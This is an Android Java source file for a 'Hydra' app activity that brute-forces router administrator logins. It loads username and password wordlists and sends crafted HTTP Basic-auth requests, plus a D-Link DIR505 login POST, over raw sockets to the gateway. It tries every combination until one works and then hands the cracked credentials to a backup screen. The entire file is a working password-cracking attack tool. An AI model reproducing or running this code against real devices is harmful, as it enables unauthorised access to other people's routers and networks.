package com.powerock.hydra;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutionException;

import com.powerock.demo2.R;
import com.powerock.hydra.RouterInfoActivity.SetRouterTypeTask;
import com.powerock.hydra.common.BaseUtils;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class GetPassActivity extends Activity {
	private static int PASS_NUMBER = 400;
	
	private Button nextButton;
	private Button startButton;
	private String gateway;

	private TextView usernameView;
	private TextView passView;

	private TextView passImageView;

	private String viewContent = "";

	private String userpass;

	private static List<String> user = new ArrayList<String>();
	private static List<String> pass = new ArrayList<String>();


	private int m=0, n=0;
	
	private String routerType;

	private boolean tag = true;
	private final Handler mHandler = new Handler();

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.get_pass);
		getActionBar().hide();
		passImageView = (TextView) findViewById(R.id.passview);
		passImageView.setTypeface(Typeface.createFromAsset(getAssets(),
				"font/highpixel7.ttf"));
		passImageView.setTextColor(Color.GREEN);
		DisplayMetrics metric = new DisplayMetrics();
		getWindowManager().getDefaultDisplay().getMetrics(metric);
		int width = metric.widthPixels; 
		android.view.ViewGroup.LayoutParams params = passImageView.getLayoutParams();  
	    params.height= width*5/7;
	    params.width =width*5/7;
	    passImageView.setLayoutParams(params);
	    
	    try {
			initDict(this);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Intent intent = getIntent();
		gateway = intent.getStringExtra("ip");
		routerType = intent.getStringExtra("type");
		usernameView = (TextView) findViewById(R.id.usernametext);
		passView = (TextView) findViewById(R.id.passwordtext);

		
		for (int i = 0; i < PASS_NUMBER; i++)
			viewContent = viewContent + getCharacterAndNumber() + " ";
		passImageView.setText(viewContent);

		nextButton = (Button) findViewById(R.id.nextButton);

		startButton = (Button) findViewById(R.id.startButton);

		startButton.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				startButton.setClickable(false);
				startButton.setTextColor(Color.parseColor("#4e537b"));
				
				
				if(routerType.equals("DIR505")){
					
							DCrackTask task = new DCrackTask();
							task.execute(gateway, user.get(m), pass.get(n));
				}else{
				
						CrackTask task = new CrackTask();
						task.execute(gateway, user.get(m), pass.get(n));
				}
			}
		});

		nextButton.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				Intent intent = new Intent();
				intent.setClass(GetPassActivity.this, BackupActivity.class);
				intent.putExtra("ip", gateway);
				intent.putExtra("userpass", userpass);
				intent.putExtra("type", routerType);
				startActivity(intent);
			}
		});

	}

	class DCrackTask extends AsyncTask<String, Integer, Boolean> {

		@Override
		protected Boolean doInBackground(String... arg0) {
			// TODO Auto-generated method stub
			
			byte[] passByte = (arg0[1] + ":" + arg0[2]).getBytes();
			
			String requestBody = "request=login&admin_user_name=" 
			+Base64.encodeToString(arg0[1].getBytes(), Base64.DEFAULT).replace("\n", "")
			+"&admin_user_pwd="
			+Base64.encodeToString(arg0[2].getBytes(), Base64.DEFAULT).replace("\n", "")
			+"&user_type=0";
			int bodyLen = requestBody.length();
			String host = arg0[0]+":80";
			String crackInfo = "POST /my_cgi.cgi?0.19053262051841724 HTTP/1.1\r\nHost: "
			+ host
			+"\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nReferer: http://"
			+host
			+"/login_real.htm\r\nContent-Length: "
			+bodyLen
			+"\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n"
			+ requestBody;
			Socket socket = null;
			try {
				socket = new Socket(arg0[0], 80);
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			OutputStream ops = null;
			try {
				ops = socket.getOutputStream();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			byte[] bytes = crackInfo.getBytes();

			try {
				ops.write(bytes);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			try {
				ops.flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			InputStreamReader is = null;
			try {
				is = new InputStreamReader(socket.getInputStream(), "GB2312");
			} catch (UnsupportedEncodingException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

			BufferedReader br = new BufferedReader(is);

			String line = null;
			
			String content = "";
			try {
				while ((line = br.readLine()) != null) {
					content += line;
				}
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			try {
				socket.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if(content.contains("<root><redirect_page>back</redirect_page></root>"))
				return false;
			else 
				return true;
			
			
		}

		@Override
		protected void onPostExecute(Boolean result) {
			// TODO Auto-generated method stub
			super.onPostExecute(result);
			if (result.toString().equals("true")) {
				nextButton.setEnabled(true);
				nextButton.setTextColor(Color.parseColor("#ffffff"));
				tag = false;
			} 
			
			if(n==pass.size()-1 && tag){
				m++;
				n=0;
				DCrackTask task = new DCrackTask();
				try {
					result = task.execute(gateway, user.get(m), pass.get(n)).get();
					usernameView.setText(user.get(m));
					passView.setText(pass.get(n));
					viewContent = "";
					for (int i = 0; i < PASS_NUMBER; i++)
						viewContent = viewContent + getCharacterAndNumber()
								+ " ";
					passImageView.setText(viewContent);
					System.out.println("result:" + result);
					System.out.println("user[i], pass[j]:" + user.get(m)
							+ "    " + pass.get(n));
					System.out.println("usernameView:"
							+ usernameView.getText());
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (ExecutionException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}else if(n < pass.size() && m < user.size() && tag){
				n++;
				DCrackTask task = new DCrackTask();
				try {
					result = task.execute(gateway, user.get(m), pass.get(n)).get();
					usernameView.setText(user.get(m));
					passView.setText(pass.get(n));
					viewContent = "";
					for (int i = 0; i < PASS_NUMBER; i++)
						viewContent = viewContent + getCharacterAndNumber()
								+ " ";
					passImageView.setText(viewContent);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (ExecutionException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}else if(!tag){
				Toast.makeText(GetPassActivity.this, "破解成功", Toast.LENGTH_SHORT).show();
			}else{
				usernameView.setText("");
				passView.setText("");
				Toast.makeText(GetPassActivity.this, "破解失败", Toast.LENGTH_SHORT).show();
			}
			
		}
		
		protected void onProgressUpdate(Integer... values){
			
		}
	}

	
	class CrackTask extends AsyncTask<String, Integer, Boolean> {

		@Override
		protected Boolean doInBackground(String... arg0) {
			// TODO Auto-generated method stub
			byte[] passByte = (arg0[1] + ":" + arg0[2]).getBytes();

			userpass = Base64.encodeToString(passByte, Base64.DEFAULT).replace(
					"\n", "");
			String crackInfo = "GET / HTTP/1.1\r\nHost: "
					+ arg0[0]
					+ "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAuthorization: Basic "
					+ userpass + "\r\n\r\n";
			Socket socket = null;
			try {
				socket = new Socket(arg0[0], 80);
			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			OutputStream ops = null;
			try {
				ops = socket.getOutputStream();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			byte[] bytes = crackInfo.getBytes();

			try {
				ops.write(bytes);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			try {
				ops.flush();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			InputStreamReader is = null;
			try {
				is = new InputStreamReader(socket.getInputStream(), "GB2312");
			} catch (UnsupportedEncodingException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

			BufferedReader br = new BufferedReader(is);

			String line = null;
			try {
				line = br.readLine();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

			while (line != null) {
				System.out.println("line:" + line);
				if (line.contains("401")) {
					try {
						socket.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					return false;
				} else {
					return true;
				}
			}
			return false;
		}

		@Override
		protected void onPostExecute(Boolean result) {
			// TODO Auto-generated method stub
			super.onPostExecute(result);
			if (result.toString().equals("true")) {
				nextButton.setEnabled(true);
				nextButton.setTextColor(Color.parseColor("#ffffff"));
				tag = false;
			} 
			
			if(n==pass.size()-1 &&n < pass.size() && m < user.size()-1 && tag){
				m++;
				n=0;
				CrackTask task = new CrackTask();
				try {
					result = task.execute(gateway, user.get(m), pass.get(n)).get();
					usernameView.setText(user.get(m));
					passView.setText(pass.get(n));
					viewContent = "";
					for (int i = 0; i < PASS_NUMBER; i++)
						viewContent = viewContent + getCharacterAndNumber()
								+ " ";
					passImageView.setText(viewContent);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (ExecutionException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}else if(n < pass.size()-1 && m < user.size() && tag){
				n++;
				CrackTask task = new CrackTask();
				try {
					result = task.execute(gateway, user.get(m), pass.get(n)).get();
					usernameView.setText(user.get(m));
					passView.setText(pass.get(n));
					viewContent = "";
					for (int i = 0; i < PASS_NUMBER; i++)
						viewContent = viewContent + getCharacterAndNumber()
								+ " ";
					passImageView.setText(viewContent);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (ExecutionException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}else if(!tag){
				BaseUtils.customToast(GetPassActivity.this, "破解成功!");
			}else{
				usernameView.setText("？？？？？？？");
				passView.setText("？？？？？？？");
				BaseUtils.customToast(GetPassActivity.this, "破解失败!");
			}
			
			
			
		}
		
		protected void onProgressUpdate(Integer... values){
			
		}
	}
	
	
	
	private String getCharacterAndNumber() {
		String password = "";
		Random random = new Random();
		for (int i = 0; i < 2; i++) {

			password += String.valueOf(random.nextInt(10));
		}
		return password;
	}

	private static void initDict(Context context) throws IOException{
		File dir = new File(Environment.getExternalStorageDirectory()
				+ "/Hydra/RouterDict");
		if (!dir.exists()) {
			System.out.println(2);
			dir.mkdirs();
		}
		String usernameText = Environment.getExternalStorageDirectory()
				+ "/Hydra/RouterDict/username.txt";
		String passwordText = Environment.getExternalStorageDirectory()
				+ "/Hydra/RouterDict/password.txt";
		if (!(new File(usernameText).exists())) {
			InputStream is = null;
			is = context.getResources().openRawResource(R.raw.username);
			FileOutputStream fos = null;
			try {
				fos = new FileOutputStream(usernameText);
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			byte[] buffer = new byte[8192];
			int count = 0;
			try {
				while ((count = is.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				fos.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				is.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		
		if (!(new File(passwordText).exists())) {
			InputStream is = null;
			is = context.getResources().openRawResource(R.raw.password);
			FileOutputStream fos = null;
			try {
				fos = new FileOutputStream(passwordText);
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			byte[] buffer = new byte[8192];
			int count = 0;
			try {
				while ((count = is.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				fos.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				is.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		File usernameFile = new File(usernameText);
		BufferedReader usernameReader = null;
		BufferedReader passReader = null;
		usernameReader = new BufferedReader(new FileReader(usernameFile));
		String line1 = null;
		while ((line1 = usernameReader.readLine()) != null) {
			 user.add(line1);
			}
		File passwordFile = new File(passwordText);
		passReader = new BufferedReader(new FileReader(passwordFile));
		String line2 = null;
		while ((line2 = passReader.readLine()) != null) {
			 pass.add(line2);
			}
		usernameReader.close();
		passReader.close();
	}
}
